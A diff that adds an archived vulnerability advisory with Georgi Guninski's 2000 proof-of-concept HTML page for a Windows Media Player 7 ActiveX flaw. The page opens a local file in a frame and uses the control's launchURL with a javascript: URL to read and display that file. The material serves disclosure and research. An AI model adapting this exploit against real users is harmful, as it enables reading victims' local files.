@@ -1,0 +1,61 @@
+source: http://www.securityfocus.com/bid/2167/exploit
+
+Windows Media Player is an application used for digital audio, and video content viewing. It can be embedded in webpages as an ActiveX control.
+
+It is possible to execute a javascript URL from within the Windows Media Player ActiveX control embedded in HTML. This javascript can be executed in arbitrary "already open" frames, specified within the ActiveX control. By doing this, an attacker can take over the frame's DOM (document object model), bypassing security restrictions. This would be accomplished through a special webpage and having the victim visit the webpage.
+
+An attacker exploiting this vulnerability can read files on the users filesystem and reportedly execute arbitrary programs on the victim host. 
+
+<HTML>
+<HEAD>
+<TITLE>
+Windows Media Player 7 and IE vulnerability - executing arbitrary programs
+</TITLE>
+</HEAD>
+<BODY>
+<H3>
+Windows Media Player 7 and IE vulnerability - executing arbitrary programs
+</H3>
+<BR>
+<p>Legal Notice:
+<br>This Advisory and Demonstration is Copyright (c) 2000 Georgi Guninski. You may distribute
+it unmodified. You may not modify it and distribute it or distribute parts
+of it without the author's written permission.
+<p>Disclaimer:
+<br>The opinions expressed in this advisory and program are my own and
+not of any company.
+<br>The usual standard disclaimer applies, especially the fact that Georgi
+Guninski
+<br>is not liable for any damages caused by direct or&nbsp; indirect use
+of the information or functionality provided by this advisory or program.
+<br>Georgi Guninski, bears no responsibility for content or misuse of this
+advisory or program or any derivatives thereof.
+<BR>
+Read the <A HREF="wmp7ie-desc.html">Advisory</A> for more information.
+<BR>
+<object id="o1" classid="clsid:6BF52A52-394A-11D3-B153-00C04F79FAA6" WIDTH=0 HEIGHT=0>
+<PARAM NAME="defaultFrame" value="georgi">
+</object>
+<SCRIPT>
+alert("This page reads C:\\test.txt");
+window.open("file://c:/test.txt","georgi");
+function f()
+{
+document.o1.object.launchURL("javascript:alert(document.body.innerText)");
+}
+setTimeout("f()",1000);
+</SCRIPT>
+<BR>
+<center>(C) Copyright 2000 Georgi Guninski</center>
+<BR>
+<center>
+| <a href="http://www.guninski.com">Home</a> | 
+<a href="browsers.html">Internet Explorer</a> | 
+<a href="win2k.html">Windows 2000</a> | 
+<a href="exploit.html">AIX</a> | 
+<a href="netscape.html">Netscape</a> | 
+<a href="greets.html">Greets</a> | 
+<a href="index.html">More...</a> | 
+</center>
+</BODY>
+</HTML>
